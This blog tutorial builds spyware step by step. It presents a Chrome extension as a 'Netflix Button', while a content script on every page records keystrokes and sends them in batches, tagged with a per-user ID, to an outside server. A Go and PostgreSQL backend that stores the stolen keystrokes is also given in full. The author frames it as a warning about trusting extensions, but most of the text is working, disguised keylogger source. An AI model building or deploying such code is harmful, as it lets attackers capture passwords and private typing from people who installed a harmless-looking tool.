# Writing Spyware Made Easy

Recently, I saw a [forum post](https://forum.sublimetext.com/t/rfc-default-package-control-channel-and-package-telemetry/30157) about how the startup [KITE](https://getkite.co/) added ~~spyware~~ “telemetry tracking” to an open source project. I thought it was interesting to see how shocked people were that a software package was spying on them. It made me realize I, and others, trust software extensions far too much. Over trusting extensions is dangerous, it's simple to write spyware into them. To show how simple, we are going to walk through all the steps of adding very simplistic, but powerful, spyware into a Google Chrome extension. We will write both the spyware client and the server to receive data.

## Client
The first step in making spyware is creating a client. We are going to create a simple Chrome Extension that is a button to open up Netflix in a new tab. Then add spyware that records every keystroke in the browser and then sends it to a server.

### `manifest.json`
The first thing we need to create for our new Chrome app is a `manifest.json` file. The [manifest file](https://developer.chrome.com/extensions/manifest) is the configuration file for Chrome Extensions. We are going to start by setting the `manifest_version` to `2` (It always has to be `2`), then adding the extensions `name`, `description`, `version`, `homepage_url`, `icons` which are self-describing fields, so we won't go into those. However, the `browser_action`, `background`, `permissions`, and `content_scripts` fields require some explanation.

* `browser_action`  lists the properties of the button located in extension bar in Chrome.
* `background`  defines a script that is triggered when a user clicks our button in the extension bar. This script runs in an isolated sandbox and cannot directly look at information from a websites users visit.  We use the background script to open up a new tab with Netflix. `persistent: false` let the script be unloaded by Chrome when it is not in use, which frees up memory and other system resources.
* `permissions` give the ability to create and manage `tabs` and use Chrome’s extension `storage`. We use `tabs` to create the new Netflix tab and `storage` to create a buffer for users keystrokes.
* `content_scripts` defines a JavaScript file that is injected into **every single HTML page** that a user visits. We set the script to the keystroke spyware, `spy.js`.

```json
{
  "manifest_version": 2,
  "name": "Netflix Button",
  "description": "Shortcut to Netflix on Chrome!",
  "version": "1.0",
  "homepage_url": "https://github.com/719Ben/chrome-spyware",
  "icons": {
    "16": "icon16.png",
    "48": "icon48.png",
    "128": "icon128.png"
  },
  "browser_action": {
    "default_icon": "icon16.png",
    "default_title": "Open Netflix!"
  },
  "background": {
    "scripts": [
      "background.js"
    ],
    "persistent": false
  },
  "permissions": [
    "tabs",
    "storage"
  ],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["spy.js"]
    }
  ]
}
```

### `background.js`
As was mentioned above, `background.js` is where the legitimate part of our extension lives. We want our extension to open up Netflix when a user clicks the icon, so we need an event listener that creates a new tab. The code is straightforward and only ends up being 2 lines.

```javascript
window.chrome.browserAction.onClicked.addListener((activeTab) => {
  window.chrome.tabs.create({
    url: 'https://www.netflix.com/'
  })
})
```

We now have a fully functioning extension (without spyware) ready to put on the internet.

### `spy.js`
We are going to start by creating an event listener for when a user types. Javascript has three event listeners for when a user interacts with their keyboard; `onkeydown`, `onkeyup`, and `onkeypress`. There is a more formal definition of the difference on [Stack Overflow](https://stackoverflow.com/questions/3396754/onkeypress-vs-onkeyup-and-onkeydown), but I'll try to summarize a more practical version.

* `onkeydown` gets almost every keystroke, every non-input keys such as `shift`, `alt`, `control`. However, `onkeydown` can not tell the case of the keystroke. It is triggered when the key is first pressed down. It also catches multiple keystrokes if a user holds down the key.
* `onkeyup` also gets almost every keystroke including non-input keys and also cannot detect the case of the keystrokes. The only practical difference from `onkeydown` is that it triggered once the key is released, so it does not catch keystrokes caused by holding down a key.
* `onkeypress` triggers when the key is pressed down, just like `onkeydown`. Like  `onkeyup`, it does not detect when a user holds down a key. It is the only event that can detect the case of keystroke, but it is the only event that cannot detect button presses that are non-input.

We are creating our extension to be simple but effective as possible. Because character case is more valuable for our spyware than non-input keystrokes, we start our keylogger by using `onkeypress`. We are going to set the event to trigger an anonymous function, then log the key.

```javascript
document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)
  console.log(letter)
}
```

Now that the extension is “logging” all of a users keystroke on every page, it needs to send the keys to a remote server. We can do this by making a simple post request with a few lines of JavaScript to a server.

```javascript
document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)

  let xhr = new window.XMLHttpRequest()
  xhr.open('POST', 'https://netflix.719ben.com/', true)
  xhr.setRequestHeader('Content-type',
                       'application/x-www-form-urlencoded')
  xhr.send(`letter=${letter}`)
}
```

We could stop there, the extension would send every keystroke any user of our extension made, but we can make a few changes that make it much more effective and efficient. We want to be able to tell the difference between each user that uses the extension, so we generate an (almost always) unique id for each one. We can use `window.crypto` to generate a random string and put it into an `int8` array that has 32 elements. Then convert the random array to a hexadecimal string.

```javascript
const getRandomToken = () => {
  let randomPool = new Uint8Array(32)
  window.crypto.getRandomValues(randomPool)
  let hexToken = ''
  for (let i = 0; i < randomPool.length; ++i) {
    hex += randomPool[i].toString(16)
  }
  return hexToken
}
```

We want to be able to generate this token once and then store it so we can keep track of a user over time. To do this, the [chrome.storage](https://developer.chrome.com/extensions/storage) API is needed. We can use the API to save an ID for every computer which our extension is on. We are first going to check if we have an ID already stored, creating one if we do not.

```javascript
window.chrome.storage.local.get('userId', (items) => {
  let userId = items.userId

  if (userId === undefined) {
    userId = getRandomToken()
    window.chrome.storage.local.set({userId: newId})
  }
})
```

Now that we have a way to generate new Ids for all browsers using the extension, we need to start sending those Ids to the server. This will only require a few small changes.

```javascript
document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)
  let userId = null

  window.chrome.storage.local.get('userId', (items) => {
    userId = items.userId
    if (userId === undefined) {
      userId = getRandomToken()
      window.chrome.storage.local.set({userId: userId})
    }
  })

  let xhr = new window.XMLHttpRequest()
  xhr.open('POST', 'https://netflix.719ben.com/', true)
  xhr.setRequestHeader('Content-type',
                       'application/x-www-form-urlencoded')
  xhr.send(`userId=${userId}&letter=${letter}`)
}
```

We are going to make one final addition to our spyware, a buffer. A request every keystroke is a little unnecessary considering [most people type at least 40 WPM](https://en.wikipedia.org/wiki/Words_per_minute). We already have set up a way to store things in Chrome, which will make a great place for us to store keystroke to be sent in groups. So we are going to add a simple buffer that only sends a request to our server every 20 keystrokes and store keystrokes in Chrome until 20 are queued.

```javascript
document.onkeypress = (evt) => {
  let letter = String.fromCharCode(evt.keyCode)
  let userId = null

  window.chrome.storage.local.get('userId', (items) => {
    userId = items.userId
    if (userId === undefined) {
      userId = getRandomToken()
      window.chrome.storage.local.set({userId: userId})
    }
  })

  window.chrome.storage.local.get('letterArray', (items) => {
    let letterArray = items.letterArray
    if (letterArray === undefined) {
      letterArray = ''
    }

    letterArray += letter

    if (letterArray.length > 19) {
      let xhr = new window.XMLHttpRequest()
      xhr.open('POST', 'https://netflix.719ben.com/', true)
      xhr.setRequestHeader('Content-type',
                           'application/x-www-form-urlencoded')
      xhr.send(`userId=${userId}&letters=${letterArray}`)
      // clear the array
      letterArray = ''
    }
    window.chrome.storage.local.set({letterArray: letterArray})
  })
}

const getRandomToken = () => {
  let randomPool = new Uint8Array(32)
  window.crypto.getRandomValues(randomPool)
  let hex = ''
  for (let i = 0; i < randomPool.length; ++i) {
    hex += randomPool[i].toString(16)
  }
  return hex
}
```

Now we have a fulling functioning chrome extension that sends users to Netflix when they click a button and sends a server all the user’s keystrokes inside of Netflix, along with other websites they visit.

### Icons
I used Photoshop to generate the icons used in the extension. View the icons, along with the rest of the code, in the current repo.

## Server
Now that we have a fully functioning client sending data to a random server, we need to create a server. We are going to be creating a straightforward server in Go that parses our request and inserts the `id` and character list into a database. First, install [Go](https://golang.org/doc/install), [go-pg/pg](https://github.com/go-pg/pg), and [PostgreSQL](https://wiki.postgresql.org/wiki/Detailed_installation_guides). Next, we write a single HTTP Handler that parses the input that we defined in the Client. Since the Client does not care about a response, we won’t bother returning one.

```go
package main

import (
  "log"
  "net/http"
)

func spywareHandler(w http.ResponseWriter, r *http.Request) {
  userId := r.FormValue("userId")
  letters := r.FormValue("letters")
  log.Println(userId, letters)
}

func main() {
  http.HandleFunc("/", spywareHandler)
  http.ListenAndServe(":8000", nil)
}
```

Now that we have our data, we want to start sending it to the PostgreSQL database. We are going to be using the [go-pg/pg](https://github.com/go-pg/pg) ORM package to connect to our database. To configure our database variables, we are going to use an environment variable.

```bash
export DATABASE_URL="postgres://postgres:@localhost:5432/chrome_spyware"
```

`go-pg/pg` doesn’t have a built in function to handle database strings, so we need to write our own. The function gets environment variable, parse the database string, connect to the database, and return the connection.

```go
func createDB() *pg.DB {
  url := os.Getenv("DATABASE_URL")
  url = strings.TrimPrefix(url, "postgres://")

  dbAt := strings.LastIndex(url, "/") + 1
  database := url[dbAt:]
  url = url[:dbAt-1]

  authAndHost := strings.Split(url, "@")
  auth := strings.Split(authAndHost[0], ":")
  username := auth[0]
  password := auth[1]
  hostAndPort := authAndHost[1]

  db := pg.Connect(&pg.Options{
    User:     username,
    Password: password,
    Database: database,
    Addr:     hostAndPort,
  })

  return db
}
```

Since `go-pg/pg` is an ORM, we want to create an object to represent each set of data we get from a client.

```go
type Event struct {
  UserId  string
  Letters   string
  Timestamp time.Time
}
```

The final thing we need to do is add the data to our database. Since we are using an ORM, it is only a few lines of code. One of the last important things is to make the database connection global so that there is only one connection. Then we put all out parts together to get our full server.

```go
package main

import (
  "github.com/go-pg/pg"
  "log"
  "net/http"
  "os"
  "strings"
  "time"
)

var DBConnection *pg.DB

type Event struct {
  UserId  string
  Letters   string
  Timestamp time.Time
}

func createDB() *pg.DB {
  url := os.Getenv("DATABASE_URL")
  url = strings.TrimPrefix(url, "postgres://")

  dbAt := strings.LastIndex(url, "/") + 1
  database := url[dbAt:]
  url = url[:dbAt-1]

  authAndHost := strings.Split(url, "@")
  auth := strings.Split(authAndHost[0], ":")
  username := auth[0]
  password := auth[1]
  hostAndPort := authAndHost[1]

  db := pg.Connect(&pg.Options{
    User:     username,
    Password: password,
    Database: database,
    Addr:     hostAndPort,
  })

  return db
}

func spywareHandler(w http.ResponseWriter, r *http.Request) {
  userId := r.FormValue("userId")
  letters := r.FormValue("letters")
  event := &Event{userId, letters, time.Now()}

  inErr := DBConnection.Insert(event)
  if inErr != nil {
    log.Println(inErr)
    return
  }
}

func main() {
  DBConnection = createDB()
  http.HandleFunc("/", spywareHandler)
  http.ListenAndServe(":8000", nil)
}
```

Now we have a fully functioning server to receive and store all the keystrokes that clients send. We need to create a SQL database that matches, which should be very easy since we only have one table `events`.

```sql
CREATE TABLE events (
  userId text,
  letters text,
  "timestamp" timestamp with time zone
);
```

After we get the database set up, we are done! We can now run our server locally or upload it to [Heroku](http://heroku.com/) without any trouble.

## Conclusion
There we have it, a client and server for our custom spyware. Even though we have a new extension ready for upload the Chrome Extension Store, uploading it would violate the [terms of service](https://developer.chrome.com/webstore/terms#review). While I chose to focus on writing spyware for a Google Chrome Extension, the ease of which we wrote it is not exclusive to Chrome Extensions. It would be equally as easy to write spyware into extensions of almost every modern day program.

View code on [Github](https://github.com/719Ben/719Ben.github.io).

If you see any errors, please make a [pull request](https://github.com/719Ben/719Ben.github.io) or let me know on [twitter](https://twitter.com/719ben), I would love to fix them!
